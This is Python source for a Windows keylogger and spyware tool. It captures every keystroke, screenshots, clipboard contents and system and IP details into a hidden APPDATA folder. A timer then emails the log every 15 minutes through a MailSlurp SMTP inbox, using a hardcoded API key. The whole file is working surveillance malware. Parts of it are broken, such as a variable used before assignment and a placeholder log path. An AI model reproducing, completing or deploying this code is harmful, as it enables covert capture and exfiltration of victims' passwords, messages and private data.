from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from threading import Timer
import time

from os import access
import mailslurp_client
from requests import options
from smtplib import SMTP
from threading import Timer
import time
from email.message import EmailMessage

from os import access
import mailslurp_client
from requests import options
from smtplib import SMTP

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import os

from cryptography.fernet import Fernet

from scipy.io.wavfile import write
import sounddevice as sd

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information= "systeminfo.txt"
screenshot_information= "screenshot.png"
clipboard_information = "clipboard.txt"

#file_path to be changed to C:\Users\Geek\AppData\Roaming
file_path = os.getenv('APPDATA')
try:
    os.mkdir(file_path + '\\keylogger')
except:
    pass

extend="\\keylogger\\"

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
screenshot()

def computer_information():
    with open(file_path+extend+system_information,"a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPaddr + "\n")
computer_information()

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            f.write("\n Clipboard Data: \n" + data)
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

        except:
            f.write("Clipboard could not be copied")
copy_clipboard()

count = 0
keys=[]
def on_press(key):
    global keys,count
    print(key)
    keys.append(key)
    count += 1
    if hasattr(key, 'char') and key.char == '\x03':
        copy_clipboard()
    elif hasattr(key, 'char') and key.char == '\x16':
        copy_clipboard()

    if count >= 1:
        count = 0
        write_file(keys)
        keys =[]

def write_file(keys):
    with open(file_path+extend+keys_information,"a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if key==Key.space:
                f.write(' [space] ')
            elif key==Key.shift or key == Key.shift_l or key == Key.shift_r:
                f.write(" [shift] \n")
                f.close()
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                f.write(" [ctrl] \n")
                f.close()
            elif key == Key.alt_l or key == Key.alt_gr:
                f.write(" [alt] \n")
                f.close()
            elif key==Key.enter:
                f.write(" [enter] \n")
                f.close()
            elif key == Key.backspace:
                f.write(" [backspace] \n")
                f.close()
            elif key==Key.caps_lock:
                f.write(" [caps_lock] \n")
                f.close()
            elif key==Key.tab:
                f.write(" [tab] \n")
                f.close()
            elif key==Key.end:
                f.write(" [end] \n")
                f.close()
            elif key==Key.home:
                f.write(" [home] \n")
                f.close()
            elif key==Key.page_down:
                f.write(" [page_down] \n")
                f.close()
            elif key==Key.page_up:
                f.write(" [page_up] \n")
                f.close()
            elif key==Key.pause:
                f.write(" [pause] \n")
                f.close()
            elif key==Key.insert:
                f.write(" [insert] \n")
                f.close()
            elif key==Key.up:
                f.write(" [up] \n")
                f.close()
            elif key==Key.down:
                f.write(" [down] \n")
                f.close()
            elif key==Key.right:
                f.write(" [right] \n")
                f.close()
            elif key==Key.left:
                f.write(" [left] \n")
                f.close()
            elif key==Key.delete:
                f.write(" [delete] \n")
                f.close()

            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key==Key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

def send_email():
# create a mailslurp configuration
    configuration = mailslurp_client.Configuration()
    configuration.api_key['x-api-key'] = "40a688f9057922a582256f5b0ac396ebf21f194681ac2b9a0c6dbc521be79dbe" #change api
    with mailslurp_client.ApiClient(configuration) as api_client:
    # create an inbox
        inbox_controller = mailslurp_client.InboxControllerApi(api_client)
        options = mailslurp_client.CreateInboxDto()
        options.name = "data"
        options.inbox_type="SMTP_INBOX"
        inbox = inbox_controller.create_inbox_with_options(options)
        #print("email address is " + inbox.email_address)
    
    access_details=inbox_controller.get_imap_smtp_access(inbox_id=inbox.id)
    with open("log.txt", 'rb') as f: #need to change log.txt to actual path
        file_data=f.read() 
        file_name=f.name
    
    #print(access_details)
    #print("sending")
    with SMTP(
        host=access_details.smtp_server_host,
        port= access_details.smtp_server_port,
    ) as smtp:
        msg= EmailMessage()
        msg.add_attachment(file_data, maintype='text', subtype='plain',filename=file_name)
        smtp.login(user=access_details.smtp_username,password=access_details.smtp_password)
        smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
        smtp.quit()
    #print("check your mail :)")


#defining time interval for sending the data
t = Timer(900.0, send_email) #900 seconds,ie 15 mins, can be changed 
t.start()

